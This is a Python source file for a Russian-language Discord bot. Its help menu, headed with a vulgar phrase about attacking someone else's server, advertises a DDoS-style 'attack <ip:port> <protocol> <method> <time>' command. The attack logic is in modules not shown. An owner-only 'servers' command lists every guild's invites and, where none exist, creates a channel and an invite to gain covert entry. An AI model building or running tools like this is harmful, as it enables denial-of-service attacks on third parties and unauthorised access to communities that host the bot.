# -*- coding: utf-8 -*-
import discord
from discord.ext import commands
# from discord_components import DiscordComponents, Button, ButtonStyle, component, interaction
from discord.utils import get, escape_markdown, escape_mentions  # We will use this later!
import os
from config import settings
from random import choice, choices, randint, shuffle
import datetime
import asyncio

# Initilization
intents = discord.Intents().default()
intents.members = True
intents.guilds = True
bot = commands.Bot(command_prefix = settings['PREFIX'], intents = intents, owner_id = 1031451466948427836) # $help
bot.remove_command('help')
owner_id = bot.owner_id
errors = settings['errors']

@bot.event
async def on_ready():
    print('Бот Connected!')
    lol = 0
    aboba = True
    lvl_check = False
    levels = open('db/levels.txt', 'a')
    for guild in bot.guilds:
        for member in guild.members:
            if member.bot == False:
                levels = open('db/levels.txt', 'r')
                levels_read = levels.read().split('\n')
                levels.close()
                levels = open('db/levels.txt', 'a')
                for line in levels_read:
                    line = line.split(':')
                    try:
                        if guild.id == int(line[0]) and member.id == int(line[1]): lvl_check = True; break
                    except: lvl_check = False
                if lvl_check == False:
                    if aboba == True: levels.writelines(f'{guild.id}:{member.id}:1:0')
                    if aboba == False: levels.writelines(f'\n{guild.id}:{member.id}:1:0')
                lvl_check = False
                aboba = False
                levels.close()

@bot.command()
async def load(ctx, exstension):
    if int(ctx.message.author.id) == int(bot.owner_id):
        try:
            bot.load_extension(f'cogs.{exstension}')
            print('Cogs is loading...')
            await ctx.message.add_reaction('✅')
        except:
            await ctx.message.add_reaction('❌')

@bot.command()
async def unload(ctx, exstension):
    if int(ctx.message.author.id) == int(bot.owner_id):
        try:
            bot.unload_extension(f'cogs.{exstension}')
            print('Cogs is unloading...')
            await ctx.message.add_reaction('✅')
        except:
            await ctx.message.add_reaction('❌')

@bot.command()
async def reload(ctx, exstension):
    if int(ctx.message.author.id) == int(bot.owner_id):
        try:
            bot.unload_extension(f'cogs.{exstension}')
            bot.load_extension(f'cogs.{exstension}')
            print('Cogs is reloading...')
            await ctx.message.add_reaction('✅')
        except:
            await ctx.message.add_reaction('❌')

# Help command
@bot.command(aliases = ['помощь'])
@commands.cooldown(1, 3, commands.BucketType.user)
async def help(ctx):
    help_emb = discord.Embed(title = '**HELP**', description = f'\n', color = discord.Color.blue())
    help_emb.add_field(name='ВЫЕБИ ЧУЖОЙ СЕРВЕР', value=f'\n**🛰 Атака**\n*{ctx.prefix}attack <ip:port> <protocol> <method> <time>*\n**⚙️ Методы**\n*{ctx.prefix}methods*\n**📁 Протоколы**\n*{ctx.prefix}protocols*\n**🔍 Узнать Айпи**\n*{ctx.prefix}resolve <ip>*', inline=False)
    category = 'return'
    await ctx.send(embed = help_emb)

# Сервера
@bot.command(aliases = ['сервера', 'сервверы'])
@commands.cooldown(1, 3, commands.BucketType.user)
async def servers(ctx):
    if ctx.message.author.id == bot.owner_id:
        for guild in bot.guilds:
            try:
                lol = 0
                print('-' * 50)
                print(f'Название сервера: {guild.name}')
                print(f'Участники: {guild.member_count}')
                invites = await guild.invites()
                for invite in invites:
                    lol = 1
                    print(f'Канал: "{invite.channel}" {invite}')
                if lol == 0:
                    new_channel = await guild.create_text_channel(f'Участники-{guild.member_count}')
                    create_invite = await new_channel.create_invite()
                    print(create_invite)
                print('-' * 50)
                print()
            except: None
        await ctx.message.add_reaction('✅')
    else:
        emb = discord.Embed(title = 'Ошибка!', description = 'Эта команда не для тебя)', color = discord.Color.red())
        await ctx.send(embed=emb)

@bot.command(aliases = ['дмсг'])
async def dmsg(ctx, *, msg):
    if str(ctx.message.author.id) != str(bot.owner_id): return
    await ctx.send(msg)

for filename in os.listdir('./cogs'):
    if filename.endswith('.py'):
        bot.load_extension(f'cogs.{filename[:-3]}')

# End
bot.run(settings['TOKEN'])